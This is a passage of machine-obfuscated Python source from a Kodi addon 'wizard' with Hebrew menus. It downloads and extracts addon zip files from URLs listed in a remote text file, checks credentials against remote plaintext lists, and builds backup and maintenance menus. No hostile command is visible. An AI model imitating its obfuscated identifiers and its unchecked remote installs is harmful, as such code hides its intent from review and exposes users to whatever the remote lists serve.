			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2487
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2488
			addFile ('%s'%O0OO0O00O0O0O0000 ,'',themeit =THEME3 )#line:2489
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2490
	setView ('files','viewType')#line:2491
def addonInstaller (O000000O000OOOOOO ,O0O0OOO00OO00O00O ):#line:2493
	if not ADDONFILE =='http://':#line:2494
		O0000O0OOO0O00000 =wiz .workingURL (O0O0OOO00OO00O00O )#line:2495
		if O0000O0OOO0O00000 ==True :#line:2496
			O00O0O00O0OO0OO0O =wiz .openURL (O0O0OOO00OO00O00O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2497
			OOO0OOO0000O000OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000000O000OOOOOO ).findall (O00O0O00O0OO0OO0O )#line:2498
			if len (OOO0OOO0000O000OO )>0 :#line:2499
				for OOOO0OO00OOO00O0O ,O0O0OOO00OO00O00O ,O0OOO00OOOOOO0OO0 ,OO0O0O00O000OO0O0 ,OOOOO0OOO000O0000 ,OO00OO000O000OOOO ,OO0O000O000O0OO0O ,O0OO000OO0OO00OOO ,OO00000000OOO0000 in OOO0OOO0000O000OO :#line:2500
					if os .path .exists (os .path .join (ADDONS ,O000000O000OOOOOO )):#line:2501
						OO0000OOO000OOOOO =['Launch Addon','Remove Addon']#line:2502
						O0OOO00OO0O000O0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0000OOO000OOOOO )#line:2503
						if O0OOO00OO0O000O0O ==0 :#line:2504
							wiz .ebi ('RunAddon(%s)'%O000000O000OOOOOO )#line:2505
							xbmc .sleep (1000 )#line:2506
							return True #line:2507
						elif O0OOO00OO0O000O0O ==1 :#line:2508
							wiz .cleanHouse (os .path .join (ADDONS ,O000000O000OOOOOO ))#line:2509
							try :wiz .removeFolder (os .path .join (ADDONS ,O000000O000OOOOOO ))#line:2510
							except :pass #line:2511
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000000O000OOOOOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2512
								removeAddonData (O000000O000OOOOOO )#line:2513
							wiz .refresh ()#line:2514
							return True #line:2515
						else :#line:2516
							return False #line:2517
					OO0OO0OOO0O0O0OOO =os .path .join (ADDONS ,O0OOO00OOOOOO0OO0 )#line:2518
					if not O0OOO00OOOOOO0OO0 .lower ()=='none'and not os .path .exists (OO0OO0OOO0O0O0OOO ):#line:2519
						wiz .log ("Repository not installed, installing it")#line:2520
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O000000O000OOOOOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOO00OOOOOO0OO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2521
							OO0O00O00O00000OO =wiz .parseDOM (wiz .openURL (OO0O0O00O000OO0O0 ),'addon',ret ='version',attrs ={'id':O0OOO00OOOOOO0OO0 })#line:2522
							if len (OO0O00O00O00000OO )>0 :#line:2523
								OOOO0OOO0OO0OOOO0 ='%s%s-%s.zip'%(OOOOO0OOO000O0000 ,O0OOO00OOOOOO0OO0 ,OO0O00O00O00000OO [0 ])#line:2524
								wiz .log (OOOO0OOO0OO0OOOO0 )#line:2525
								if KODIV >=17 :wiz .addonDatabase (O0OOO00OOOOOO0OO0 ,1 )#line:2526
								installAddon (O0OOO00OOOOOO0OO0 ,OOOO0OOO0OO0OOOO0 )#line:2527
								wiz .ebi ('UpdateAddonRepos()')#line:2528
								wiz .log ("Installing Addon from Kodi")#line:2530
								O00OOOO0O00OOO00O =installFromKodi (O000000O000OOOOOO )#line:2531
								wiz .log ("Install from Kodi: %s"%O00OOOO0O00OOO00O )#line:2532
								if O00OOOO0O00OOO00O :#line:2533
									wiz .refresh ()#line:2534
									return True #line:2535
							else :#line:2536
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OOO00OOOOOO0OO0 )#line:2537
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O000000O000OOOOOO ,O0OOO00OOOOOO0OO0 ))#line:2538
					elif O0OOO00OOOOOO0OO0 .lower ()=='none':#line:2539
						wiz .log ("No repository, installing addon")#line:2540
						O00OO0OOO0O00O0OO =O000000O000OOOOOO #line:2541
						OOO00OO00O0O0OO0O =O0O0OOO00OO00O00O #line:2542
						installAddon (O000000O000OOOOOO ,O0O0OOO00OO00O00O )#line:2543
						wiz .refresh ()#line:2544
						return True #line:2545
					else :#line:2546
						wiz .log ("Repository installed, installing addon")#line:2547
						O00OOOO0O00OOO00O =installFromKodi (O000000O000OOOOOO ,False )#line:2548
						if O00OOOO0O00OOO00O :#line:2549
							wiz .refresh ()#line:2550
							return True #line:2551
					if os .path .exists (os .path .join (ADDONS ,O000000O000OOOOOO )):return True #line:2552
					O0OOOO0O0O0000O00 =wiz .parseDOM (wiz .openURL (OO0O0O00O000OO0O0 ),'addon',ret ='version',attrs ={'id':O000000O000OOOOOO })#line:2553
					if len (O0OOOO0O0O0000O00 )>0 :#line:2554
						O0O0OOO00OO00O00O ="%s%s-%s.zip"%(O0O0OOO00OO00O00O ,O000000O000OOOOOO ,O0OOOO0O0O0000O00 [0 ])#line:2555
						wiz .log (str (O0O0OOO00OO00O00O ))#line:2556
						if KODIV >=17 :wiz .addonDatabase (O000000O000OOOOOO ,1 )#line:2557
						installAddon (O000000O000OOOOOO ,O0O0OOO00OO00O00O )#line:2558
						wiz .refresh ()#line:2559
					else :#line:2560
						wiz .log ("no match");return False #line:2561
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2562
		else :wiz .log ("[Addon Installer] Text File: %s"%O0000O0OOO0O00000 )#line:2563
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2564
def installFromKodi (O0OO00OO0OOOO0OOO ,over =True ):#line:2566
	if over ==True :#line:2567
		xbmc .sleep (2000 )#line:2568
	wiz .ebi ('RunPlugin(plugin://%s)'%O0OO00OO0OOOO0OOO )#line:2570
	if not wiz .whileWindow ('yesnodialog'):#line:2571
		return False #line:2572
	xbmc .sleep (1000 )#line:2573
	if wiz .whileWindow ('okdialog'):#line:2574
		return False #line:2575
	wiz .whileWindow ('progressdialog')#line:2576
	if os .path .exists (os .path .join (ADDONS ,O0OO00OO0OOOO0OOO )):return True #line:2577
	else :return False #line:2578
def installAddon (O0O0OO00O000O0O0O ,OO00O000OO0OO0OO0 ):#line:2580
	if not wiz .workingURL (OO00O000OO0OO0OO0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0O0OO00O000O0O0O ,COLOR2 ));return #line:2581
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2582
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO00O000O0O0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2583
	O00OO0OO00OO000OO =OO00O000OO0OO0OO0 .split ('/')#line:2584
	OO00O0OOOOOO0OO00 =os .path .join (PACKAGES ,O00OO0OO00OO000OO [-1 ])#line:2585
	try :os .remove (OO00O0OOOOOO0OO00 )#line:2586
	except :pass #line:2587
	downloader .download (OO00O000OO0OO0OO0 ,OO00O0OOOOOO0OO00 ,DP )#line:2588
	OO0O0OO000OOO00O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO00O000O0O0O )#line:2589
	DP .update (0 ,OO0O0OO000OOO00O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2590
	O0OOOOO0O0OOO0OO0 ,OO00OO0O0000O0OO0 ,OOOO0OO0OO0OOOO00 =extract .all (OO00O0OOOOOO0OO00 ,ADDONS ,DP ,title =OO0O0OO000OOO00O0 )#line:2591
	DP .update (0 ,OO0O0OO000OOO00O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2592
	installed (O0O0OO00O000O0O0O )#line:2593
	installDep (O0O0OO00O000O0O0O ,DP )#line:2594
	DP .close ()#line:2595
	wiz .ebi ('UpdateAddonRepos()')#line:2596
	wiz .ebi ('UpdateLocalAddons()')#line:2597
	wiz .refresh ()#line:2598
def installDep (O0O0OO00OO0OO00OO ,DP =None ):#line:2600
	OO0OO0OO0OOO00000 =os .path .join (ADDONS ,O0O0OO00OO0OO00OO ,'addon.xml')#line:2601
	if os .path .exists (OO0OO0OO0OOO00000 ):#line:2602
		O0O0O0OOO000OO000 =open (OO0OO0OO0OOO00000 ,mode ='r');OOOOOOO0O000O0OO0 =O0O0O0OOO000OO000 .read ();O0O0O0OOO000OO000 .close ();#line:2603
		OO0000OOOOO00OO00 =wiz .parseDOM (OOOOOOO0O000O0OO0 ,'import',ret ='addon')#line:2604
		for OOO0O00000OO000OO in OO0000OOOOO00OO00 :#line:2605
			if not 'xbmc.python'in OOO0O00000OO000OO :#line:2606
				if not DP ==None :#line:2607
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O00000OO000OO ))#line:2608
				wiz .createTemp (OOO0O00000OO000OO )#line:2609
def installed (OO000OOO0O0OO0O00 ):#line:2636
	OO0OOOO00O0OOOOO0 =os .path .join (ADDONS ,OO000OOO0O0OO0O00 ,'addon.xml')#line:2637
	if os .path .exists (OO0OOOO00O0OOOOO0 ):#line:2638
		try :#line:2639
			OOO0O0000OO00000O =open (OO0OOOO00O0OOOOO0 ,mode ='r');O0OO0O0000OO0OOO0 =OOO0O0000OO00000O .read ();OOO0O0000OO00000O .close ()#line:2640
			OOO000OO0O0OO0O00 =wiz .parseDOM (O0OO0O0000OO0OOO0 ,'addon',ret ='name',attrs ={'id':OO000OOO0O0OO0O00 })#line:2641
			OOO0OO00O0O0O00O0 =os .path .join (ADDONS ,OO000OOO0O0OO0O00 ,'icon.png')#line:2642
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO000OO0O0OO0O00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO0OO00O0O0O00O0 )#line:2643
		except :pass #line:2644
def youtubeMenu (url =None ):#line:2646
	if not YOUTUBEFILE =='http://':#line:2647
		if url ==None :#line:2648
			OOO0O0OO0O0O00OO0 =wiz .workingURL (YOUTUBEFILE )#line:2649
			O00O000O0OO0000O0 =uservar .YOUTUBEFILE #line:2650
		else :#line:2651
			OOO0O0OO0O0O00OO0 =wiz .workingURL (url )#line:2652
			O00O000O0OO0000O0 =url #line:2653
		if OOO0O0OO0O0O00OO0 ==True :#line:2654
			OO000000O00O00OO0 =wiz .openURL (O00O000O0OO0000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2655
			O0OOO0OO0OO00OOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000000O00O00OO0 )#line:2656
			if len (O0OOO0OO0OO00OOO0 )>0 :#line:2657
				for O000O0O000O0O0OO0 ,OO000OOOOO0OOOOOO ,url ,O00O0OOO0O00OO000 ,O0O0000000OO000OO ,O000OO000OO000O00 in O0OOO0OO0OO00OOO0 :#line:2658
					if OO000OOOOO0OOOOOO .lower ()=="yes":#line:2659
						addDir ("[B]%s[/B]"%O000O0O000O0O0OO0 ,'youtube',url ,description =O000OO000OO000O00 ,icon =O00O0OOO0O00OO000 ,fanart =O0O0000000OO000OO ,themeit =THEME3 )#line:2660
					else :#line:2661
						addFile (O000O0O000O0O0OO0 ,'viewVideo',url =url ,description =O000OO000OO000O00 ,icon =O00O0OOO0O00OO000 ,fanart =O0O0000000OO000OO ,themeit =THEME2 )#line:2662
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2663
		else :#line:2664
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2665
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2666
			addFile ('%s'%OOO0O0OO0O0O00OO0 ,'',themeit =THEME3 )#line:2667
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2668
	setView ('files','viewType')#line:2669
def STARTP ():#line:2670
	OOO00000O00O0OO0O =(ADDON .getSetting ("pass"))#line:2671
	if BUILDNAME =="":#line:2672
	 if not NOTIFY =='true':#line:2673
          O0O0O000OO0000OO0 =wiz .workingURL (NOTIFICATION )#line:2674
	 if not NOTIFY2 =='true':#line:2675
          O0O0O000OO0000OO0 =wiz .workingURL (NOTIFICATION2 )#line:2676
	 if not NOTIFY3 =='true':#line:2677
          O0O0O000OO0000OO0 =wiz .workingURL (NOTIFICATION3 )#line:2678
	OO00OO0O0O0000OOO =OOO00000O00O0OO0O #line:2679
	O0O0O000OO0000OO0 =urllib2 .Request (SPEED )#line:2680
	O00O00OOO00OOOOO0 =urllib2 .urlopen (O0O0O000OO0000OO0 )#line:2681
	O00O00O000OOO0O00 =O00O00OOO00OOOOO0 .readlines ()#line:2683
	OOOO00OO0O00OOO00 =0 #line:2687
	for OO0O00OOOOO000O00 in O00O00O000OOO0O00 :#line:2688
		if OO0O00OOOOO000O00 .split (' ==')[0 ]==OOO00000O00O0OO0O or OO0O00OOOOO000O00 .split ()[0 ]==OOO00000O00O0OO0O :#line:2689
			OOOO00OO0O00OOO00 =1 #line:2690
			break #line:2691
	if OOOO00OO0O00OOO00 ==0 :#line:2692
					OO0O000OOOOO0O0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2693
					if OO0O000OOOOO0O0O0 :#line:2695
						ADDON .openSettings ()#line:2697
						sys .exit ()#line:2699
					else :#line:2700
						sys .exit ()#line:2701
	return 'ok'#line:2705
def STARTP2 ():#line:2706
	O00OO0OOOO0O0000O =(ADDON .getSetting ("user"))#line:2707
	O0O0OO00O00000O00 =(UNAME )#line:2709
	OOOOO0000OO0O000O =urllib2 .urlopen (O0O0OO00O00000O00 )#line:2710
	OO00O0O0O00OOO0OO =OOOOO0000OO0O000O .readlines ()#line:2711
	O0OOO000O00O0OOOO =0 #line:2712
	for OOO0O00O00O00OOOO in OO00O0O0O00OOO0OO :#line:2715
		if OOO0O00O00O00OOOO .split (' ==')[0 ]==O00OO0OOOO0O0000O or OOO0O00O00O00OOOO .split ()[0 ]==O00OO0OOOO0O0000O :#line:2716
			O0OOO000O00O0OOOO =1 #line:2717
			break #line:2718
	if O0OOO000O00O0OOOO ==0 :#line:2719
		O00O00OOO0OOO0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2720
		if O00O00OOO0OOO0O0O :#line:2722
			ADDON .openSettings ()#line:2724
			sys .exit ()#line:2727
		else :#line:2728
			sys .exit ()#line:2729
	return 'ok'#line:2733
def passandpin ():#line:2734
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2735
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2736
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2737
def passandUsername ():#line:2738
	ADDON .openSettings ()#line:2739
def folderback ():#line:2742
    OO0OOOOO0OO0OO0OO =ADDON .getSetting ("path")#line:2743
    if OO0OOOOO0OO0OO0OO :#line:2744
      OO0OOOOO0OO0OO0OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2745
      ADDON .setSetting ("path",OO0OOOOO0OO0OO0OO )#line:2746
def backmyupbuild ():#line:2749
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2753
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2754
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2755
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2757
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2758
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2759
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2761
def maintMenu (view =None ):#line:2765
	OOOO0O00OO0O00O0O ='[B][COLOR green]ON[/COLOR][/B]';OOOOO0000000O0O0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2767
	O00O0O0OOO0OOO0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2768
	O00OO00O000OOO00O ='true'if AUTOCACHE =='true'else 'false'#line:2769
	O0O000O0OO00000OO ='true'if AUTOPACKAGES =='true'else 'false'#line:2770
	OOOOO0OO00OOOO000 ='true'if AUTOTHUMBS =='true'else 'false'#line:2771
	OO00O00OO00O0OO00 ='true'if SHOWMAINT =='true'else 'false'#line:2772
	OOOOO0OO00OO0O000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2773
	OOOOOOOO00OOO00O0 ='true'if INCLUDEALL =='true'else 'false'#line:2774
	OO0O00O0O000O0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2775
	if wiz .Grab_Log (True )==False :OO00OOO0O0OOO00O0 =0 #line:2776
	else :OO00OOO0O0OOO00O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2777
	if wiz .Grab_Log (True ,True )==False :OO0000000OOOOO0O0 =0 #line:2778
	else :OO0000000OOOOO0O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2779
	O000O000OOOO00000 =int (OO00OOO0O0OOO00O0 )+int (OO0000000OOOOO0O0 )#line:2780
	OO0OOOOOOO0000000 =str (O000O000OOOO00000 )+' Error(s) Found'if O000O000OOOO00000 >0 else 'None Found'#line:2781
	OO00OOOO00O0O0O0O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2782
	if OOOOOOOO00OOO00O0 =='true':#line:2783
		OOO000000O0OOO000 ='true'#line:2784
		O00OOOOOO0000O0OO ='true'#line:2785
		O0000O000O0O00OOO ='true'#line:2786
		O000O0O00O00O0OOO ='true'#line:2787
		OOOO0OO0000000OOO ='true'#line:2788
		O0O000O0O000O000O ='true'#line:2789
		OO0O0OO0O0OO00OOO ='true'#line:2790
		O0OO0OOO000O0O00O ='true'#line:2791
	else :#line:2792
		OOO000000O0OOO000 ='true'if INCLUDEBOB =='true'else 'false'#line:2793
		O00OOOOOO0000O0OO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2794
		O0000O000O0O00OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2795
		O000O0O00O00O0OOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2796
		OOOO0OO0000000OOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2797
		O0O000O0O000O000O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2798
		OO0O0OO0O0OO00OOO ='true'if INCLUDESALTS =='true'else 'false'#line:2799
		O0OO0OOO000O0O00O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2800
	O000OO000OOO00OO0 =wiz .getSize (PACKAGES )#line:2801
	OO00OOO0OOOO00O0O =wiz .getSize (THUMBS )#line:2802
	OO0O0000O0O0O0O0O =wiz .getCacheSize ()#line:2803
	OO000O0OO000OOO00 =O000OO000OOO00OO0 +OO00OOO0OOOO00O0O +OO0O0000O0O0O0O0O #line:2804
	O0OOOOOO0O000OOOO =['Daily','Always','3 Days','Weekly']#line:2805
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2806
	if view =="clean"or SHOWMAINT =='true':#line:2807
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000O0OO000OOO00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2808
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0000O0O0O0O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2809
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OO000OOO00OO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2810
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OOO0OOOO00O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2811
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2812
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2813
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2814
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2815
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2816
	if view =="addon"or SHOWMAINT =='false':#line:2817
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2820
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2824
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2825
	if view =="misc"or SHOWMAINT =='true':#line:2826
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('View Errors in Log: %s'%(OO0OOOOOOO0000000 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('Clear Wizard Log File%s'%OO00OOOO00O0O0O0O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2835
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2836
	if view =="backup"or SHOWMAINT =='true':#line:2837
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="tweaks"or SHOWMAINT =='true':#line:2851
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2852
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		else :#line:2854
			if os .path .exists (ADVANCED ):#line:2855
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2856
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2857
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2864
	addFile ('Show All Maintenance: %s'%OO00O00OO00O0OO00 .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2865
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2866
	addFile ('Third Party Wizards: %s'%OO0O00O0O000O0OOO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2867
	if OO0O00O0O000O0OOO =='true':#line:2868
		O00O00000O0O0O00O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2869
		OO0OOO0O0O0000O00 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2870
		O0O0OO0OO000O00OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2871
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O00000O0O0O00O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOO0O0O0000O00 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0OO0OO000O00OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2875
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00O0O0OOO0OOO0OO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2876
	if O00O0O0OOO0OOO0OO =='true':#line:2877
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OOOOOO0O000OOOO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2878
